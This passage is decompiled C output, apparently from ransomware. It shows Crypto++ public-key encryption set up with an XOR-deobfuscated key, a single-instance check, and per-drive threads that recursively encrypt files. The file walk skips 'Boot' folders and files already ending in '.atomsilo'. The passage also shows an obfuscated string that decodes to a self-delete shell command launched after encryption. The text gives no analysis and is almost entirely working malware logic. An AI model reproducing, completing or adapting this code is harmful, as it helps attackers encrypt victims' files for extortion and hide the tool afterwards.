  v7 = (*(__int64 (__fastcall **)(__int64 *))(v46[0] + 40))(v46);
  (*(void (__fastcall **)(char *, __int64))(v6 + 16))((char *)v44 + *(int *)(v44[0] + 4), v7);
  v21 = 0i64;
  v22 = 0i64;
  v23 = 0i64;
  v24 = 0i64;
  v25 = 0i64;
  v26 = 0i64;
  sub_13F10EE30((__int64)&v21, 0);
  v21 = off_13F182988;
  v22 = off_13F182AF8;
  v24 = qword_13F1C70F0;
  v25 = 548i64;
  v26 = 0i64;
  v8 = *(__int64 (__fastcall **)(__int64))(v42 + 48);
  if ( v8 == sub_13F1041C0 )
  {
    v9 = *(__int64 (__fastcall **)(__int64))(v41 + 72);
    if ( v9 == sub_13F104200 )
      v10 = v44;
    else
      v10 = (__int64 *)(v9((__int64)&v41) + 16);
  }
  else
  {
    v10 = (__int64 *)v8((__int64)&v42);
  }
  v11 = (char *)v10 + *(int *)(*v10 + 4);
  (*(void (__fastcall **)(char *, __int64 (__fastcall ***)()))(*(_QWORD *)v11 + 40i64))(v11, &v21);
  LOBYTE(v16) = 1;
  ((void (__fastcall *)(__int64 (__fastcall ***)(), _QWORD, _QWORD, __int64, int))v21[6])(
    &v21,
    0i64,
    0i64,
    0xFFFFFFFFi64,
    v16);
  qword_13F1B91E8 = v26;
  v21 = off_13F182988;
  v22 = off_13F182AF8;
  sub_13F105A90(&v43);
  v44[13] = (__int64)&CryptoPP::NameValuePairs::`vftable';
  v27 = off_13F182988;
  v28 = off_13F182AF8;
  sub_13F105B40(v47);
  v48[48] = &CryptoPP::NameValuePairs::`vftable';
  if ( v40 )
    (**v40)(v40, 1i64);
  v12 = v38;
  if ( v37 < v38 )
    v12 = v37;
  if ( v39 == (char *)&v36[1] + (((unsigned __int8)v36 + 8) & 0xF) )
    memset(v39, 0, v12);
  result = ((unsigned __int8)v36 - 48) & 0xF;
  if ( v36[0] == &v33[result + 8] )
  {
    v14 = v35;
    if ( v34 < v35 )
      v14 = v34;
    result = 0i64;
    memset(v36[0], 0, v14);
  }
  return result;
}
// 13F17A6E5: write access to const memory at 13F1B7C88 has been detected
// 13F17A80C: write access to const memory at 13F1B91E8 has been detected
// 13F17A805: variable 'v16' is possibly undefined
// 13F182988: using guessed type __int64 (__fastcall *off_13F182988[46])();
// 13F182AF8: using guessed type void *off_13F182AF8[4];
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F1B7C88: using guessed type __int64 qword_13F1B7C88;
// 13F1B91E8: using guessed type __int64 qword_13F1B91E8;
// 13F1C70F0: using guessed type __int64 qword_13F1C70F0[512];
// 13F1C8100: using guessed type __int64 qword_13F1C8100[512];
// 13F17A530: using guessed type _QWORD var_228[17];

//----- (000000013F17A920) ----------------------------------------------------
void **__fastcall sub_13F17A920(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4, __int64 a5, _QWORD *a6)
{
  __int64 v9; // r9
  __int64 v10; // r14
  unsigned __int64 v11; // rax
  unsigned __int64 i; // rsi
  __int64 v13; // r12
  _QWORD *v14; // r15
  __int64 v15; // rdi
  _QWORD *v16; // rbx
  __int64 v17; // rax
  __int64 v18; // rdx
  unsigned __int64 v19; // rcx
  void *v20; // rdx
  __int64 v21; // rax
  __int64 v22; // rdx
  __int64 v23; // rax
  unsigned __int64 v24; // rcx
  void *v25; // rdx
  void **result; // rax
  char v27[8]; // [rsp+38h] [rbp-C8h] BYREF
  __int64 v28; // [rsp+40h] [rbp-C0h]
  __int64 v29; // [rsp+48h] [rbp-B8h]
  unsigned __int64 v30; // [rsp+58h] [rbp-A8h]
  unsigned __int64 v31; // [rsp+60h] [rbp-A0h]
  void *v32; // [rsp+68h] [rbp-98h]
  __int64 v33; // [rsp+70h] [rbp-90h]
  unsigned __int64 v34; // [rsp+78h] [rbp-88h]
  __int64 v35; // [rsp+80h] [rbp-80h]
  _QWORD *v36; // [rsp+88h] [rbp-78h]
  _QWORD *v37; // [rsp+90h] [rbp-70h]
  void **v38; // [rsp+98h] [rbp-68h] BYREF
  void (__fastcall ***v39)(_QWORD, __int64); // [rsp+A0h] [rbp-60h]
  void **v40; // [rsp+B0h] [rbp-50h] BYREF
  void (__fastcall ***v41)(_QWORD, __int64); // [rsp+B8h] [rbp-48h]
  __int64 (__fastcall **v42)(); // [rsp+D0h] [rbp-30h] BYREF
  void **v43; // [rsp+D8h] [rbp-28h]
  void (__fastcall ***v44)(_QWORD, __int64); // [rsp+E8h] [rbp-18h]
  __int64 v45[3]; // [rsp+100h] [rbp+0h] BYREF
  int v46; // [rsp+118h] [rbp+18h]
  char v47; // [rsp+120h] [rbp+20h]
  __int64 v48[3]; // [rsp+140h] [rbp+40h] BYREF
  __int64 v49; // [rsp+158h] [rbp+58h] BYREF
  __int64 v50[15]; // [rsp+168h] [rbp+68h] BYREF
  __int64 v51[3]; // [rsp+1E0h] [rbp+E0h] BYREF
  __int64 (__fastcall ***v52)(_QWORD, __int64); // [rsp+1F8h] [rbp+F8h]
  char v53[152]; // [rsp+250h] [rbp+150h] BYREF

  v35 = -2i64;
  v33 = a3;
  sub_13F15EF70((__int64)v51, 0, 0x70ui64);
  sub_13F103340((__int64)v51, a1, a2, v9, 0i64);
  sub_13F15EF70((__int64)v48, 0, 0x98ui64);
  sub_13F105500(v48);
  (*(void (__fastcall **)(char *, __int64 *))(*(__int64 *)((char *)v50 + *(int *)(v50[0] + 4)) + 48))(
    (char *)v50 + *(int *)(v50[0] + 4),
    v51);
  sub_13F15EF70((__int64)v53, 0, 0x98ui64);
  sub_13F132C90((__int64)v53);
  sub_13F133210((__int64)v53, 0i64, 0i64);
  v10 = 0i64;
  v11 = sub_13F104930(v48);
  v34 = v11;
  for ( i = 0i64; i < a4; i += v34 )
  {
    v13 = a4 - i;
    if ( v11 < a4 - i )
      v13 = v11;
    v14 = (_QWORD *)sub_13F14059C(48i64);
    v36 = v14;
    *v14 = 0i64;
    v14[1] = 0i64;
    v14[2] = 0i64;
    v14[3] = 0i64;
    v14[4] = 0i64;
    v14[5] = 0i64;
    v15 = *a6 - v10;
    sub_13F10EE30((__int64)v14, 0);
    *v14 = off_13F182988;
    v14[1] = off_13F182AF8;
    v14[3] = v10 + a5;
    v14[4] = v15;
    v14[5] = 0i64;
    sub_13F15EF70((__int64)&v42, 0, 0x70ui64);
    v16 = (_QWORD *)sub_13F14059C(152i64);
    v37 = v16;
    sub_13F15EF70((__int64)v16, 0, 0x98ui64);
    v17 = (*(__int64 (__fastcall **)(__int64 *, char *, _QWORD, __int64 (__fastcall *(**)[2])()))(v48[0] + 56))(
            v48,
            v53,
            0i64,
            &off_13F1B7048);
    sub_13F128FE0((__int64)v16, v17, 0i64, 0i64, (__int64)v14);
    *v16 = &CryptoPP::PK_EncryptorFilter::`vftable';
    v16[1] = off_13F19C018;
    sub_13F128E90((__int64)&v42, 0i64);
    sub_13F129580((__int64)&v42, (__int64)v16);
    v42 = off_13F188680;
    v43 = off_13F188828;
    sub_13F10EE30((__int64)v45, 0);
    v46 = -1;
    v47 = 0;
    v45[0] = (__int64)off_13F185528;
    v45[1] = (__int64)off_13F1856A0;
    v30 = -1i64;
    v31 = 0i64;
    v32 = 0i64;
    v28 = 0i64;
    v29 = 0i64;
    v27[0] = 0;
    v18 = sub_13F107650((__int64)&v38, (__int64)"InputBuffer", (__int64)v27, 1u);
    sub_13F12A860(v45, v18);
    if ( v39 )
      (**v39)(v39, 1i64);
    v38 = &CryptoPP::NameValuePairs::`vftable';
    v19 = v31;
    if ( v30 < v31 )
      v19 = v30;
    v20 = v32;
    if ( v32 )
    {
      memset(v32, 0, v19);
      sub_13F12E550(v20);
    }
    v42 = off_13F188848;
    v43 = off_13F1889F0;
    v30 = -1i64;
    v31 = 0i64;
    v32 = 0i64;
    v28 = i + v33;
    v29 = v13;
    v27[0] = 0;
    v21 = sub_13F107650((__int64)&v40, (__int64)"InputBuffer", (__int64)v27, 1u);
    if ( v42 == off_13F188848 )
      (*(void (__fastcall **)(__int64 *, __int64))(v45[0] + 64))(v45, v21);
    else
      ((void (__fastcall *)(__int64 (__fastcall ***)(), __int64))v42[8])(&v42, v21);
    if ( v42 == off_13F188848 )
    {
      v23 = ((__int64 (__fastcall *)(__int64 (__fastcall ***)()))v42[42])(&v42);
      sub_13F1114A0((__int64)v45, v23, (__int64)&qword_13F1B7008, 1);
    }
    else
    {
      LOBYTE(v22) = 1;
      ((void (__fastcall *)(__int64 (__fastcall ***)(), __int64))v42[50])(&v42, v22);
    }
    if ( v41 )
      (**v41)(v41, 1i64);
    v40 = &CryptoPP::NameValuePairs::`vftable';
    v24 = v31;
    if ( v30 < v31 )
      v24 = v30;
    v25 = v32;
    if ( v32 )
    {
      memset(v32, 0, v24);
      sub_13F12E550(v25);
    }
    v10 += v14[5];
    v42 = off_13F188680;
    v43 = off_13F188828;
    if ( v44 )
      (**v44)(v44, 1i64);
    v11 = v34;
  }
  *a6 = v10;
  sub_13F103FE0((__int64)v53);
  sub_13F105A90(&v49);
  v50[13] = (__int64)&CryptoPP::NameValuePairs::`vftable';
  v51[0] = (__int64)off_13F188680;
  result = off_13F188828;
  v51[1] = (__int64)off_13F188828;
  if ( v52 )
    return (void **)(**v52)(v52, 1i64);
  return result;
}
// 13F17A997: variable 'v9' is possibly undefined
// 13F17ADC6: variable 'v22' is possibly undefined
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F182988: using guessed type __int64 (__fastcall *off_13F182988[46])();
// 13F182AF8: using guessed type void *off_13F182AF8[4];
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F185528: using guessed type __int64 (__fastcall *off_13F185528[47])();
// 13F1856A0: using guessed type void *off_13F1856A0[3];
// 13F188680: using guessed type __int64 (__fastcall *off_13F188680[53])();
// 13F188828: using guessed type void *off_13F188828[4];
// 13F188848: using guessed type __int64 (__fastcall *off_13F188848[53])();
// 13F1889F0: using guessed type void *off_13F1889F0[4];
// 13F19B998: using guessed type void *CryptoPP::PK_EncryptorFilter::`vftable';
// 13F19C018: using guessed type __int64 (__fastcall *off_13F19C018[4])();
// 13F1B7008: using guessed type __int64 qword_13F1B7008;
// 13F1B7048: using guessed type __int64 (__fastcall *(*off_13F1B7048)[2])();
// 13F17A920: using guessed type char var_2F8[8];

//----- (000000013F17ADE0) ----------------------------------------------------
__int64 __fastcall sub_13F17ADE0(__int64 a1, unsigned __int64 a2, __int64 a3, __int64 a4, __m128i *a5, __int64 *a6)
{
  __m128i *v8; // rsi
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // r9
  unsigned __int64 v11; // rbx
  unsigned __int64 v12; // r14
  __int64 v13; // rbp
  unsigned __int64 v14; // rcx
  __int64 v15; // rdx
  unsigned __int64 v16; // rcx
  __int64 v17; // rdx
  _DWORD *v18; // rdi
  __int64 (__fastcall **v20)(); // [rsp+30h] [rbp-A8h] BYREF
  __int64 v21[4]; // [rsp+38h] [rbp-A0h] BYREF
  unsigned __int64 v22; // [rsp+58h] [rbp-80h]
  __int128 v23; // [rsp+60h] [rbp-78h]
  unsigned __int64 v24; // [rsp+78h] [rbp-60h]
  __int128 v25; // [rsp+80h] [rbp-58h]
  __m128i v26; // [rsp+90h] [rbp-48h] BYREF

  v8 = a5;
  sub_13F15EF70((__int64)&v20, 0, 0x60ui64);
  sub_13F10EE30((__int64)v21, 1);
  v9 = 0x3FFFFFFFFFFFFFFFi64;
  v22 = 0x3FFFFFFFFFFFFFFFi64;
  v23 = 0i64;
  v10 = -1i64;
  v24 = -1i64;
  v25 = 0i64;
  v20 = off_13F1880A8;
  v21[0] = (__int64)off_13F188128;
  v11 = 0i64;
  v12 = a2 / 0x30 + 1;
  if ( a2 == 48 * (a2 / 0x30) )
    v12 = a2 / 0x30;
  v13 = 3 * v12;
  if ( a5 )
  {
    sub_13F110EC0((__int64 *)&v20, a3, 0x20ui64, (__int64)&off_13F1B7048);
    do
    {
      v26 = 0ui64;
      sub_13F12BE64((__int64)v21, v8, &v26, v8);
      v8 += 3;
      a5[v13 + 32].m128i_i64[1] = ++v11;
      if ( v11 >= 0x50000 )
        break;
      --v12;
    }
    while ( v12 );
    *a6 = v13 * 16;
    LODWORD(v11) = 1;
    v10 = v24;
    v9 = v22;
  }
  v14 = v25;
  if ( v10 < (unsigned __int64)v25 )
    v14 = v10;
  v15 = *((_QWORD *)&v25 + 1);
  if ( *((_QWORD *)&v25 + 1) )
  {
    memset(*((void **)&v25 + 1), 0, v14);
    sub_13F12E550(v15);
    v9 = v22;
  }
  v16 = v23;
  if ( v9 < (unsigned __int64)v23 )
    v16 = v9;
  v17 = *((_QWORD *)&v23 + 1);
  if ( *((_QWORD *)&v23 + 1) )
  {
    v18 = (_DWORD *)*((_QWORD *)&v23 + 1);
    while ( v16 )
    {
      *v18++ = 0;
      --v16;
    }
    sub_13F12E4D0(v17);
  }
  return (unsigned int)v11;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F1880A8: using guessed type __int64 (__fastcall *off_13F1880A8[16])();
// 13F188128: using guessed type void *off_13F188128[11];
// 13F1B7048: using guessed type __int64 (__fastcall *(*off_13F1B7048)[2])();

//----- (000000013F17AFE0) ----------------------------------------------------
__int64 __fastcall sub_13F17AFE0(__m128i *a1, unsigned __int64 a2, const __m128i *a3, unsigned __int64 a4)
{
  if ( !a4 )
    return 0i64;
  if ( !a1 )
  {
LABEL_3:
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 22i64;
  }
  if ( a3 && a2 >= a4 )
  {
    sub_13F15EB00(a1, a3, a4);
    return 0i64;
  }
  sub_13F15EF70((__int64)a1, 0, a2);
  if ( !a3 )
    goto LABEL_3;
  if ( a2 >= a4 )
    return 22i64;
  *(_DWORD *)sub_13F169DAC() = 34;
  sub_13F1682A0();
  return 34i64;
}

//----- (000000013F17B090) ----------------------------------------------------
__int64 sub_13F17B090()
{
  __m128i si128; // xmm2
  __int64 *v1; // rax
  unsigned int v2; // edx
  __m128i v3; // xmm0
  char *v4; // rcx
  __int64 v5; // rbx
  unsigned int v7; // ebx
  char *v8; // rsi
  char *v9; // rdi
  __int64 v10; // rax
  __int64 v11; // rbx
  unsigned __int64 i; // rdx
  _QWORD v13[5]; // [rsp+50h] [rbp-B0h] BYREF
  __int64 v14[3]; // [rsp+78h] [rbp-88h] BYREF
  int v15[4]; // [rsp+90h] [rbp-70h] BYREF
  int v16[16]; // [rsp+A0h] [rbp-60h] BYREF
  __int16 v17; // [rsp+E0h] [rbp-20h]
  char v18[2080]; // [rsp+110h] [rbp+10h] BYREF
  char v19[272]; // [rsp+930h] [rbp+830h] BYREF
  char v20[272]; // [rsp+A40h] [rbp+940h] BYREF

  sub_13F169E64(&qword_13F1C80F0);
  sub_13F17A530();
  sub_13F17A920(
    (__int64)qword_13F1BB170,
    548i64,
    (__int64)qword_13F1C8100,
    0x945ui64,
    (__int64)qword_13F1C9100,
    &dword_13F1B7C80);
  sub_13F15EF70((__int64)qword_13F1C8100, 0, 0x945ui64);
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCD0);
  v1 = qword_13F1BB3B0;
  v2 = 0;
  do
  {
    v3 = _mm_loadu_si128((const __m128i *)v1 - 1);
    v1 += 8;
    v2 += 64;
    *((__m128i *)v1 - 5) = _mm_xor_si128(si128, v3);
    *((__m128i *)v1 - 4) = _mm_xor_si128(si128, _mm_loadu_si128((const __m128i *)v1 - 4));
    *((__m128i *)v1 - 3) = _mm_xor_si128(si128, _mm_loadu_si128((const __m128i *)v1 - 3));
    *((__m128i *)v1 - 2) = _mm_xor_si128(si128, _mm_loadu_si128((const __m128i *)v1 - 2));
  }
  while ( v2 < 0x1A00 );
  if ( v2 < 0x1A1C )
  {
    v4 = (char *)qword_13F1BB3A0 + (int)v2;
    do
    {
      *v4++ ^= 0x42u;
      ++v2;
    }
    while ( v2 < 0x1A1C );
  }
  v5 = MEMORY[0x76F866B0](0i64, 0i64, "8d5e957f297893487bd98fa830fa6413");
  if ( (unsigned int)MEMORY[0x76F91760]() == 183 )
  {
    MEMORY[0x76F91910](v5);
  }
  else
  {
    MEMORY[0x76F91910](v5);
    sub_13F15EF70((__int64)v18, 0, 0x820ui64);
    v7 = 0;
    v15[0] = 0;
    v8 = v18;
    v9 = byte_13F1BCDC0;
    do
    {
      v10 = MEMORY[0x76F85A20](0i64, 0i64, sub_13F17B4A0, &byte_13F1BCDC0[260 * v7++], 0, v15);
      v9 += 260;
      *(_QWORD *)v8 = v10;
      v8 += 8;
    }
    while ( *v9 );
    MEMORY[0x76F80610](v7, v18, 1i64, 0xFFFFFFFFi64);
    v11 = 10i64;
    do
    {
      sub_13F109250();
      --v11;
    }
    while ( v11 );
    sub_13F15EF70((__int64)v19, 0, 0x104ui64);
    sub_13F15EF70((__int64)v20, 0, 0x104ui64);
    MEMORY[0x76F85940](0i64, v19, 260i64);
    strcpy((char *)v13, "mwn*9m*zsxq*;<A8:8:8;*7x*@*00*nov*,/},");
    for ( i = 0i64; i < 0x26; ++i )
      *((_BYTE *)v13 + i) -= 10;
    MEMORY[0x7710BB3C](v20, v13, v19);
    sub_13F15EF70((__int64)v16, 0, 0x68ui64);
    v16[0] = 104;
    v16[15] = 1;
    v17 = 0;
    if ( (unsigned int)MEMORY[0x7700AFC0](
                         0i64,
                         v20,
                         0i64,
                         0i64,
                         0,
                         16,
                         0i64,
                         0i64,
                         v16,
                         v14,
                         v13[0],
                         v13[1],
                         v13[2],
                         v13[3],
                         v13[4]) )
    {
      MEMORY[0x76F91910](v14[1]);
      MEMORY[0x76F91910](v14[0]);
      sub_13F16A14C(0);
      JUMPOUT(0x13F17B493i64);
    }
  }
  return 0i64;
}
// 13F17B48E: control flows out of bounds to 13F17B493
// 13F19CCD0: using guessed type __int128 xmmword_13F19CCD0;
// 13F1B7C80: using guessed type int dword_13F1B7C80;
// 13F1B7C88: using guessed type __int64 qword_13F1B7C88;
// 13F1BB170: using guessed type __int64 qword_13F1BB170[70];
// 13F1BB3A0: using guessed type __int64 qword_13F1BB3A0[2];
// 13F1BB3B0: using guessed type __int64 qword_13F1BB3B0[512];
// 13F1C80F0: using guessed type __int64 qword_13F1C80F0;
// 13F1C8100: using guessed type __int64 qword_13F1C8100[512];
// 13F1C9100: using guessed type __int64 qword_13F1C9100[513];
// 13F17B090: using guessed type int var_AE0[4];

//----- (000000013F17B4A0) ----------------------------------------------------
__int64 __fastcall sub_13F17B4A0(char *a1)
{
  sub_13F108A30((__int64)a1, 0);
  return sub_13F17B4D0(a1);
}

//----- (000000013F17B4D0) ----------------------------------------------------
__int64 __fastcall sub_13F17B4D0(char *a1)
{
  signed __int64 v2; // rdx
  __int64 v3; // r8
  __int64 v4; // r9
  __int64 v5; // rcx
  char v6; // al
  __int64 v7; // rcx
  char *v8; // rcx
  char *v9; // rcx
  __int64 result; // rax
  __int64 v11; // r12
  int v12; // edi
  const char *v13; // rbx
  int v14; // eax
  int v15; // esi
  unsigned __int64 v16; // r8
  const char *v17; // rdi
  const __m128i *v18; // rax
  const __m128i *v19; // rax
  unsigned __int64 i; // r8
  unsigned __int64 j; // rdx
  unsigned __int64 k; // r8
  unsigned __int64 m; // rdx
  char *v24; // rax
  __m128i v25; // [rsp+20h] [rbp-9C8h] BYREF
  int v26; // [rsp+30h] [rbp-9B8h]
  __m128i v27; // [rsp+34h] [rbp-9B4h] BYREF
  char v28[12]; // [rsp+44h] [rbp-9A4h] BYREF
  __int64 v29; // [rsp+50h] [rbp-998h]
  __int64 v30; // [rsp+58h] [rbp-990h]
  char v31[44]; // [rsp+60h] [rbp-988h] BYREF
  __m128i v32; // [rsp+8Ch] [rbp-95Ch] BYREF
  char v33; // [rsp+19Fh] [rbp-849h] BYREF
  char v34[512]; // [rsp+1A0h] [rbp-848h] BYREF
  __m128i v35[17]; // [rsp+3A0h] [rbp-648h] BYREF
  char v36[271]; // [rsp+4B0h] [rbp-538h] BYREF
  char v37; // [rsp+5BFh] [rbp-429h] BYREF
  char v38[511]; // [rsp+5C0h] [rbp-428h] BYREF
  char v39; // [rsp+7BFh] [rbp-229h] BYREF
  char v40[512]; // [rsp+7C0h] [rbp-228h] BYREF

  v30 = -2i64;
  sub_13F15EF70((__int64)v36, 0, 0x104ui64);
  v5 = 0i64;
  v6 = *a1;
  if ( *a1 )
  {
    v2 = v34 - a1;
    do
    {
      a1[v2] = v6;
      v5 = (unsigned int)(v5 + 1);
      v6 = *++a1;
    }
    while ( *a1 );
  }
  if ( (unsigned __int64)(int)v5 >= 0x200 )
  {
    _report_rangecheckfailure(v5, v2, v3, v4);
    JUMPOUT(0x13F17B9A5i64);
  }
  v34[(int)v5] = 0;
  v7 = -1i64;
  do
    ++v7;
  while ( v34[v7] );
  if ( v34[v7 - 1] != 92 )
  {
    v8 = &v33;
    do
      ++v8;
    while ( *v8 );
    *(_WORD *)v8 = 92;
  }
  strcpy(v40, v34);
  v9 = &v39;
  do
    ++v9;
  while ( *v9 );
  *(_DWORD *)v9 = 2764330;
  result = MEMORY[0x76FBC820](v40, v31);
  v11 = result;
  v29 = result;
  if ( result != -1 )
  {
    do
    {
      v12 = 0;
      if ( aBoot[0] )
      {
        v13 = "Boot";
        while ( 1 )
        {
          v14 = MEMORY[0x76F73A30](&v32, &aBoot[260 * v12++]);
          v13 += 260;
          if ( !v14 )
            break;
          if ( !*v13 )
            goto LABEL_18;
        }
      }
      else
      {
LABEL_18:
        if ( (v31[0] & 0x10) != 0 )
        {
          strcpy(v38, v34);
          v24 = &v37;
          do
            ++v24;
          while ( *v24 );
          strcpy(v24, v32.m128i_i8);
          sub_13F108A30((__int64)v38, 0);
          sub_13F17B4D0(v38);
        }
        else
        {
          v15 = 0;
          sub_13F15EF70((__int64)v35, 0, 0x104ui64);
          v16 = -1i64;
          do
            ++v16;
          while ( v32.m128i_i8[v16] );
          sub_13F15EB00(v35, &v32, v16);
          if ( aAtomsilo[0] )
          {
            v17 = ".atomsilo";
            while ( 1 )
            {
              v18 = (const __m128i *)sub_13F16D624((_BYTE *)v35);
              v19 = sub_13F15E7EC(v18, (const __m128i *)&aAtomsilo[260 * v15++]);
              v17 += 260;
              if ( v19 )
                break;
              if ( !*v17 )
                goto LABEL_25;
            }
          }
          else
          {
LABEL_25:
            v26 = 103;
            v27.m128i_i32[0] = 386864969;
            v27.m128i_i8[4] = 0;
            for ( i = 0i64; i < 4; ++i )
              v27.m128i_i8[i] ^= v26;
            v27.m128i_i8[4] = 0;
            if ( sub_13F15E7EC(&v32, &v27) )
              goto LABEL_37;
            strcpy(v25.m128i_i8, "1dvs");
            for ( j = 0i64; j < 4; v25.m128i_i8[j++] -= 3 )
              ;
            if ( sub_13F15E7EC(&v32, &v25) )
              goto LABEL_37;
            v27.m128i_i32[3] = 41;
            strcpy(v28, "\aCZY");
            for ( k = 0i64; k < 4; ++k )
              v28[k] ^= v27.m128i_u8[12];
            v28[4] = 0;
            if ( sub_13F15E7EC(&v32, (const __m128i *)v28) )
              goto LABEL_37;
            strcpy(&v25.m128i_i8[8], "5o{ts");
            for ( m = 0i64; m < 5; v25.m128i_i8[m++ + 8] -= 7 )
              ;
            if ( sub_13F15E7EC(&v32, (const __m128i *)&v25.m128i_i8[8]) )
LABEL_37:
              sub_13F108A30((__int64)v34, 1);
            sub_13F108530(v36, (__int64)"%s%s", v34, v32.m128i_i8);
            sub_13F108590((__int64)v36);
          }
        }
      }
    }
    while ( (unsigned int)MEMORY[0x76FBC7C0](v11, v31) );
    return MEMORY[0x76F8B190](v11);
  }
  return result;
}
// 13F17B9A0: control flows out of bounds to 13F17B9A5
// 13F17B9A0: variable 'v2' is possibly undefined
// 13F17B9A0: variable 'v3' is possibly undefined
// 13F17B9A0: variable 'v4' is possibly undefined
// 13F1409C8: using guessed type __int64 __fastcall _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD);
// 13F17B4D0: using guessed type char var_848[512];
// 13F17B4D0: using guessed type __m128i var_95C;
// 13F17B4D0: using guessed type __m128i var_648[17];

//----- (000000013F17F4C0) ----------------------------------------------------
__int64 sub_13F17F4C0()
{
  return sub_13F10A1FC((__int64)qword_13F1CA110);
}
// 13F17F4C0: using guessed type __int64 __fastcall sub_13F17F4C0();
// 13F1CA110: using guessed type __int64 qword_13F1CA110[9];

//----- (000000013F17F4D0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void sub_13F17F4D0()
{
  *(__m128i *)&qword_13F1B7038 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  LOBYTE(qword_13F1B7028) = 0;
}
// 13F17F519: write access to const memory at 13F1B7038 has been detected
// 13F17F521: write access to const memory at 13F1B7028 has been detected
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;
// 13F1B7028: using guessed type __int64 qword_13F1B7028;
// 13F1B7038: using guessed type __int64 qword_13F1B7038;

//----- (000000013F17F540) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void sub_13F17F540()
{
  *(__m128i *)&qword_13F1B7018 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  LOBYTE(qword_13F1B7008) = 0;
}
// 13F17F589: write access to const memory at 13F1B7018 has been detected
// 13F17F591: write access to const memory at 13F1B7008 has been detected
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;
// 13F1B7008: using guessed type __int64 qword_13F1B7008;
// 13F1B7018: using guessed type __int64 qword_13F1B7018;

//----- (000000013F17F5C0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void **sub_13F17F5C0()
{
  void **result; // rax

  result = &CryptoPP::NameValuePairs::`vftable';
  off_13F1B7048 = (__int64 (__fastcall *(*)[2])())&CryptoPP::NameValuePairs::`vftable';
  return result;
}
// 13F17F5C7: write access to const memory at 13F1B7048 has been detected
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F1B7048: using guessed type __int64 (__fastcall *(*off_13F1B7048)[2])();

//----- (000000013F17F5E0) ----------------------------------------------------
__int64 sub_13F17F5E0()
{
  memset((void *)0x3C2A00, 0, 0x10ui64);
  return sub_13F12E4D0(3942912i64);
}
// 13F17F5E0: using guessed type __int64 __fastcall sub_13F17F5E0();

//----- (000000013F17F630) ----------------------------------------------------
__int64 sub_13F17F630()
{
  memset((void *)0x3C2A30, 0, 0x10ui64);
  return sub_13F12E4D0(3942960i64);
}
// 13F17F630: using guessed type __int64 __fastcall sub_13F17F630();

//----- (000000013F17F680) ----------------------------------------------------
__int64 sub_13F17F680()
{
  memset((void *)0x3C29A0, 0, 0x10ui64);
  return sub_13F12E4D0(3942816i64);
}
// 13F17F680: using guessed type __int64 __fastcall sub_13F17F680();

//----- (000000013F17F6D0) ----------------------------------------------------
__int64 sub_13F17F6D0()
{
  return sub_13F10A1FC((__int64)qword_13F1C4570);
}
// 13F17F6D0: using guessed type __int64 __fastcall sub_13F17F6D0();
// 13F1C4570: using guessed type __int64 qword_13F1C4570[10];

//----- (000000013F17F700) ----------------------------------------------------
__int64 sub_13F17F700()
{
  memset((void *)0x3CD3B0, 0, 8ui64);
  return sub_13F12E550(3986352i64);
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F17F700: using guessed type __int64 __fastcall sub_13F17F700();

//----- (000000013F17F750) ----------------------------------------------------
void sub_13F17F750()
{
  ;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);

//----- (000000013F17F7A0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 (__fastcall **sub_13F17F7A0())()
{
  __int64 (__fastcall **result)(); // rax

  result = off_13F188A20;
  off_13F1B70C0 = (__int64 (__fastcall *(*)[2])())off_13F188A20;
  return result;
}
// 13F17F7B6: write access to const memory at 13F1B70C0 has been detected
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F188A20: using guessed type __int64 (__fastcall *off_13F188A20[2])();
// 13F1B70C0: using guessed type __int64 (__fastcall *(*off_13F1B70C0)[2])();

//----- (000000013F17F830) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F17F830()
{
  off_13F1B7110 = (__int64 (__fastcall *(*)[2])())off_13F188A10;
  memset((void *)0x3C2A90, 0, 0x10ui64);
  sub_13F12E4D0(3943056i64);
  memset((void *)0x3C2A60, 0, 0x10ui64);
  return sub_13F12E4D0(3943008i64);
}
// 13F17F846: write access to const memory at 13F1B7110 has been detected
// 13F17F830: using guessed type __int64 __fastcall sub_13F17F830();
// 13F188A10: using guessed type __int64 (__fastcall *off_13F188A10[2])();
// 13F1B7110: using guessed type __int64 (__fastcall *(*off_13F1B7110)[2])();

//----- (000000013F17F8BC) ----------------------------------------------------
void sub_13F17F8BC()
{
  sub_13F14212C();
}

//----- (000000013F17F8C8) ----------------------------------------------------
__int64 sub_13F17F8C8()
{
  return sub_13F1782B0();
}
// 13F17F8C8: using guessed type __int64 __fastcall sub_13F17F8C8();

//----- (000000013F17F8D4) ----------------------------------------------------
void sub_13F17F8D4()
{
  sub_13F178328();
}

//----- (000000013F17F8E0) ----------------------------------------------------
void sub_13F17F8E0()
{
  ;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F17F928) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F17F928()
{
  return 10i64;
}
// 13F17F945: write access to const memory at 13F1B7BE8 has been detected
// 13F17F928: using guessed type __int64 __fastcall sub_13F17F928();
